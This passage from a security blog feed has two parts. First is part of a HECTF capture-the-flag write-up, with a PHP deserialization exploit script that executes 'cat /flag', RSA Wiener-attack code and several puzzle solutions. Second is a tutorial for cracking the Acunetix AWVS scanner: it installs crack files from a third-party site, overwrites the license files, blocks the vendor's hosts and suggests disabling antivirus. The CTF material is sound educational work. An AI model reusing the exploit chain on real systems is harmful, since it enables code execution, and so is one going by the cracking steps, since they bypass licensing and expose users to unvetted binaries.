keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>		$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">good</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>array<span class="token punctuation">)</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            echo <span class="token string">'must_array'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">public</span> $value <span class="token operator">=</span> <span class="token string">"cat /flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token parameter">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span>$func<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>            <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">'y0u_A2e_HacKK!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>            <span class="token function">$func</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>$a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>echo <span class="token function">serialize</span><span class="token punctuation">(</span>$a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>echo <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>echo <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span>$a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token operator">?</span><span class="token operator">></span></pre></td></tr></table></figure><h2 id="misc"><a class="anchor" href="#misc">#</a> misc</h2>
<h3 id="快来公众号ya"><a class="anchor" href="#快来公众号ya">#</a> 快来公众号 ya</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222748980-1107695173.png" alt="image" /></p>
<p>扫码即可</p>
<h3 id="jamesharden"><a class="anchor" href="#jamesharden">#</a> JamesHarden</h3>
<p>附件下载解压后修改文件后缀，加上.zip 后解压文件是是一个.class 文件：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222901436-179167112.png" alt="image" /></p>
<p>对 URPGS {Jr1p0zr_G0_U3pg6_!} 进行 rot13 解密得到 flag：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222913142-1050466987.png" alt="image" /></p>
<h3 id="捉迷藏"><a class="anchor" href="#捉迷藏">#</a> 捉迷藏</h3>
<p>附件打开文件为一个 word 文档</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222938925-832389837.png" alt="image" /></p>
<p>根据文字提示，将作文内容字体大小改为 12</p>
<p>发现为 jsfuck 加密</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222953436-1761390993.png" alt="image" /></p>
<p><span class="exturl" data-url="aHR0cDovL2NvZGVydGFiLmNvbS9Kc1VuRnVjayVFNSU5QyVBOCVFNyVCQSVCRiVFNyVCRCU5MSVFNyVBQiU5OSVFNCVCOCVBRCVFOCVBNyVBMyVFNSVBRiU4Ng==">http://codertab.com/JsUnFuck 在线网站中解密</span></p>
<p>解密得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223005283-1218598132.png" alt="image" /></p>
<h3 id="迷途的狗狗"><a class="anchor" href="#迷途的狗狗">#</a> 迷途的狗狗</h3>
<p>附件打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223022687-2033165176.png" alt="image" /></p>
<p>打开迷途的狗狗文件夹</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223036598-81117398.png" alt="image" /></p>
<p>压缩包中有一张图片，但是需要密码</p>
<p>在 ziperello 中使用暴力破击，字符集设定为数字</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223047333-512534950.png" alt="image" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223056484-1083480393.png" alt="image" /></p>
<p>得到密码为 142345，成功解压文件得到一张图片</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223109875-741763226.png" alt="image" /></p>
<p>在 kali 中使用 binwalk 分析文件内容</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223123138-908391527.png" alt="image" /></p>
<p>发现隐藏图片中隐藏了一个 jpg 文件</p>
<p>使用 foremost 分离文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223134729-1362281137.png" alt="image" /></p>
<p>第二张图片中显示 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223144607-731012539.png" alt="image" /></p>
<h3 id="snake"><a class="anchor" href="#snake">#</a> snake</h3>
<p>玩到 6000 分给了个提示</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223210251-1771729246.png" alt="image" /></p>
<p>溯源找到源码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223219200-373798834.png" alt="image" /></p>
<p>重新修改 show_text 函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223237584-2129485803.png" alt="image" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223252907-736145641.png" alt="image" /></p>
<p>进行 pyinstaller 反打包后有个 snake.pyc，pyc 反编译成 py 后就是它的源码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223305798-2102838000.png" alt="image" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223319885-1495512728.png" alt="image" /></p>
<p>得到 flag：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223334853-1498515998.png" alt="image" /></p>
<h3 id="问卷调查"><a class="anchor" href="#问卷调查">#</a> 问卷调查</h3>
<p>简简单单签个退吧就，下次继续。</p>
<h2 id="crypto"><a class="anchor" href="#crypto">#</a> crypto</h2>
<h3 id="签到"><a class="anchor" href="#签到">#</a> 签到</h3>
<p>附件打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223408762-1613593406.png" alt="image" /></p>
<p>与佛论禅解密得到一串 base64 密文</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>SkJDVUdWQ0dQTlRXNjMzRUw1V0hLWTNMTDVURzY0UzdQRlhYSzdJPQ<span class="token operator">==</span></pre></td></tr></table></figure><p>解密后再 base32 解密得到 flag：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223422547-1772196661.png" alt="image" /></p>
<h3 id="rsa_e_n"><a class="anchor" href="#rsa_e_n">#</a> RSA_e_n</h3>
<p>附件：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223436375-881610782.png" alt="image" /></p>
<p>rsa 中的 e,n,c 解密，直接上脚本：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> RSAwienerHacker</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x14b367bf01efd4dc667b8e62975479c612c96e78f7f1f55242b2973c882ddcb33a65c52174d8ae1273764ce429054ea3f2fdc38ff205443c92ef4198739f05aa11fc10d3fc6ff30c8f5f05a04f43e3d8fc9bfffe916b2e0360560a162729e91b7775bda70177e0f875626e0a81bd4eacea9948b02232a82659f8d9aa9b4c754f</span></pre></td></tr><tr><td data-num="5"></td><td><pre>n <span class="token operator">=</span> <span class="token number">0x75be564267f8bf6c2038dd0cadfeecbc3158acfc27e679dd0bdb0db0e90bd5198a0a7edc0626f357a2d75f3c37ede045b7f7ca6bda79e5bf6fc0aea0aa7beda587388599d2b77b538fc3e666784493ffaf731e2ae232e8e9e9f9f2a4df25c19b7680f5bf6c485bd87923f01c17d8ec35438772c28e361774e6e7681d67ecbe19</span></pre></td></tr><tr><td data-num="6"></td><td><pre>c <span class="token operator">=</span> <span class="token number">10127659956533419108589656976567211166527205183773088147543122705230809548550336271584049969380709512046523116316965506372940655242616078713681678662841367955124154879878984026023241163358487655249424233120021240245459984899558747887087199609289148343740081670749999484769650710161617077523656215330005636913</span></pre></td></tr><tr><td data-num="7"></td><td><pre>#爆破d</pre></td></tr><tr><td data-num="8"></td><td><pre>d <span class="token operator">=</span> RSAwienerHacker<span class="token punctuation">.</span><span class="token function">hack_RSA</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span><span class="token function">powmod</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span><span class="token function">unhexlify</span><span class="token punctuation">(</span><span class="token function">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>解得 flag：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223452932-116521713.png" alt="image" /></p>
<h3 id="tool"><a class="anchor" href="#tool">#</a> Tool</h3>
<p>附件：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223505160-849395067.png" alt="image" /></p>
<p>看上去是一串乱码，但是不难看出是维吉尼亚，直接丢在线网站得到 key</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223517069-1701511266.png" alt="image" /></p>
<p>根据恢复后的最后一段提示：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Well<span class="token punctuation">,</span> you already know that <span class="token keyword">this</span> is Virginia encryption<span class="token punctuation">,</span> but unfortunately<span class="token punctuation">,</span> the ultimate goal is not to <span class="token keyword">get</span> plaintext<span class="token punctuation">,</span> but to <span class="token keyword">get</span> the key<span class="token punctuation">.</span> For the flag <span class="token keyword">of</span> <span class="token keyword">this</span> question<span class="token punctuation">,</span> you need to add an underscore <span class="token keyword">in</span> the middle <span class="token keyword">of</span> the key<span class="token punctuation">,</span> and then add the flag standard format to it<span class="token punctuation">,</span> and you can submit it<span class="token punctuation">.</span></pre></td></tr></table></figure><p>在中间加入下划线即可得到 flag</p>
<h3 id="encode"><a class="anchor" href="#encode">#</a> encode</h3>
<p>附件：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223532960-239563614.png" alt="image" /></p>
<p>emoji 表情加密，直接在线解，得到：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">你好呀，送你串字符吧</span><span class="token operator">:</span>ɯlxɹƃluʌ‾ʌdɹo‾ɟlq‾lʍ <span class="token operator">:</span> dǝʇs ʇsɐl</pre></td></tr></table></figure><p>文本倒序得到下一步：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223547209-636405504.png" alt="image" /></p>
<p>根据题目提示《逾越节的阴谋》</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223555933-317357979.png" alt="image" /></p>
<p>可以知道是埃特巴什密码，解码后即可得到 flag。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223605940-523504742.png" alt="image" /></p>
<p>出题人 flag 改慢了 emmmmm，血没了，暴打出题人。</p>
<h2 id="re"><a class="anchor" href="#re">#</a> re</h2>
<h3 id="hard"><a class="anchor" href="#hard">#</a> hard</h3>
<p>附件文本格式打卡，直接搜 HECTF 即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223619495-639797158.png" alt="image" /></p>
<h2 id="pwn"><a class="anchor" href="#pwn">#</a> pwn</h2>
<h3 id="签到-2"><a class="anchor" href="#签到-2">#</a> 签到</h3>
<p>用 wirshark 追踪 tcp 流</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114223639490-1187703509.png" alt="image" /></p>
<h1 id="感言"><a class="anchor" href="#感言">#</a> 感言</h1>
<p>HECTF 可以说是我梦开始的地方，打的第一场比赛就是 2020HECTF，也就是一年前吧，那会刚入圈子，ctf 也还是刚接触，那会连栅栏都不知道是什么 QAQ！！！菜鸡自进阶 2333</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>AWVS14.5.211115146破解安装教程</title>
    <url>/article/f0e9ef2f.html</url>
    <content><![CDATA[<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGRvc2kub3JnL2F3dnMtMTQtNS0yLyMlRTUlQUUlODklRTglQTMlODUlRTUlOEMlODUlRTQlQjglOEIlRTglQkQlQkQ=">资源包获取链接</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115141908633.png" alt="image-20220115141908633" /></p>
<h2 id="1windows破解方法"><a class="anchor" href="#1windows破解方法">#</a> ①Windows 破解方法</h2>
<p>[1] 卸载旧版 awvs, 重启电脑</p>
<p>[2] Windows 下载如下两个文件并解压 (如果出现解压失败，请使用 winrar 进行解压)</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>acunetix_14<span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>211115146_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>awvs_crack_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr></table></figure><p>解压后得到</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115142240599.png" alt="image-20220115142240599" /></p>
<p>[3] 双击 acunetix_14.5.211115146.exe 进行安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115142339357.png" alt="image-20220115142339357" /></p>
<p>填下注册信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115142410689.png" alt="image-20220115142410689" /></p>
<p>选择服务端口，可自行修改也可默认</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115142527309.png" alt="image-20220115142527309" /></p>
<p>一路默认 <code>next</code>  后开始安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115142628429.png" alt="image-20220115142628429" /></p>
<p>[4] 安装完成后填写之前的注册信息即可登陆</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115142920460.png" alt="image-20220115142920460" /></p>
<p>登陆后可以看到处于未激活状态</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115143003959.png" alt="image-20220115143003959" /></p>
<p>[5] 复制解压得到的两个证书文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115143048963.png" alt="image-20220115143048963" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>license_info<span class="token punctuation">.</span>json</pre></td></tr><tr><td data-num="2"></td><td><pre>wa_data<span class="token punctuation">.</span>dat</pre></td></tr></table></figure><p>到安装目录进行覆盖 (替换)</p>
<p>一般默认为如下目录，如有更改自行替换</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>C<span class="token punctuation">:</span>\ProgramData\Acunetix\shared\license</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115143208429.png" alt="image-20220115143208429" /></p>
<p>[6] 在如下目录下对 hosts 文件进行修改</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>C<span class="token punctuation">:</span>\Windows\System32\drivers\etc</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115143502185.png" alt="image-20220115143502185" /></p>
<p>在 <code>hosts</code>  文件的最后加上如下两行</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> updates<span class="token punctuation">.</span>acunetix<span class="token punctuation">.</span>com</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> erp<span class="token punctuation">.</span>acunetix<span class="token punctuation">.</span>com</pre></td></tr></table></figure><p>注意：若无权限修改 hosts,①关闭杀毒软件②用其他 txt 编辑器进行修改，比如 notepad++ ,vscode</p>
<p>[7] 返回刷新页面即可成功激活.</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115143629716.png" alt="image-20220115143629716" /></p>
<h3 id="使用教程"><a class="anchor" href="#使用教程">#</a> 使用教程</h3>
<p>登录成功以后进入主页，点击 &quot;Add Target&quot; 如下图所示：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115144013916.png" alt="image-20220115144013916" /></p>
<p>或者选择 &quot;Targets&quot;-&gt;&quot;Add Target，如下图所示：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115144159780.png" alt="image-20220115144159780" /></p>
<p>在弹出的 &quot;Add Target&quot; 对话框中，输入要扫描的网站网址及描述，然后点击 &quot;save&quot;, 如下图所示：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115144429748.png" alt="image-20220115144429748" /></p>
<p>在打开的扫描选项对话框中，选择 “Target Information”，然后点击 “Scan”，如下图所示：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115144942522.png" alt="image-20220115144942522" /></p>
<p>在弹出的对话框中，选择 Scan Type、Report 和 Schedule，然后点击 “Create Scan”，如下图所示：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115144702593.png" alt="image-20220115144702593" /></p>
<p>之后开始扫描，等待扫描结果即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115144826815.png" alt="image-20220115144826815" /></p>
<p>点击 “Vulnerabilities” 可以查看扫描出来的脆弱项，如下图所示：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115145202769.png" alt="image-20220115145202769" /></p>
<p>点击 “Scan” 可以查看扫描的进程，如下图所示：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115145241517.png" alt="image-20220115145241517" /></p>
<p>扫描完成结束后，可以点击 “Reports&quot; 列表中的 Download 进行下载，下载完成以后，就可以打开扫描过程的整个报告。</p>
<h2 id="2linux破解方法"><a class="anchor" href="#2linux破解方法">#</a> ②Linux 破解方法</h2>
<p>[1] 卸载旧版 awvs, 重启电脑</p>
<p>[2] 下载如下两个文件到 linux 中</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>acunetix_14<span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>211115146_x64<span class="token punctuation">.</span>sh_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>awvs_crack_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115150233342.png" alt="image-20220115150233342" /></p>
<p>[3] 使用 <code>unrar</code>  命令进行解压</p>
<p>安装 unrar</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#下载 RAR：</span></pre></td></tr><tr><td data-num="2"></td><td><pre>wget https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>rarlab<span class="token punctuation">.</span>com<span class="token operator">/</span>rar<span class="token operator">/</span>rarlinux<span class="token operator">-</span>x64<span class="token operator">-</span><span class="token number">5.5</span><span class="token number">.0</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#解压：</span></pre></td></tr><tr><td data-num="4"></td><td><pre>tar <span class="token operator">-</span>zxvf rarlinux<span class="token operator">-</span>x64<span class="token operator">-</span><span class="token number">5.5</span><span class="token number">.0</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz<span class="token punctuation">.</span><span class="token number">1</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#安装：</span></pre></td></tr><tr><td data-num="6"></td><td><pre>cd rar</pre></td></tr><tr><td data-num="7"></td><td><pre>make</pre></td></tr><tr><td data-num="8"></td><td><pre>make install</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115150730465.png" alt="image-20220115150730465" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115150749062.png" alt="image-20220115150749062" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>unrar x <span class="token operator">-</span>pwww<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org acunetix_14<span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>211115146_x64<span class="token punctuation">.</span>sh_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>unrar x <span class="token operator">-</span>pwww<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org awvs_crack_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115150811497.png" alt="image-20220115150811497" /></p>
<p>[4] 使用如下命令进行安装</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#赋权</span></pre></td></tr><tr><td data-num="2"></td><td><pre>chmod <span class="token operator">+</span>x acunetix_14<span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>211115146_x64<span class="token punctuation">.</span>sh </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#安装</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">.</span><span class="token operator">/</span>acunetix_14<span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>211115146_x64<span class="token punctuation">.</span>sh</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115150949018.png" alt="image-20220115150949018" /></p>
<p>一路 enter 同意隐私条款直到跳出来问你是否同意隐私条款，输入 yes 回车即可.</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115151101732.png" alt="image-20220115151101732" /></p>
<p>填写注册信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115151214850.png" alt="image-20220115151214850" /></p>
<p>安装完成是这个样子的:</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115151332318.png" alt="image-20220115151332318" /></p>
<p>此时打开<span class="exturl" data-url="aHR0cHM6Ly8xMjcuMC4wLjE6MzQ0My8="> https://127.0.0.1:3443</span> 或者 <span class="exturl" data-url="aHR0cHM6Ly9sb2NhbGhvc3Q6MzQ0My8=">https://localhost:3443</span> 或者上面截图所示的黄色链接进行登录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115151447913.png" alt="image-20220115151447913" /></p>
<p>输入注册信息即可登陆</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115151510152.png" alt="image-20220115151510152" /></p>
<p>此时可以看到还是处于未激活状态:</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115151602524.png" alt="image-20220115151602524" /></p>
<p>[5] 复制解压得到的 license_info.json 和 wa_data.dat 文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115151715189.png" alt="image-20220115151715189" /></p>
<p>打开如下目录粘贴进去进行替换操作.</p>
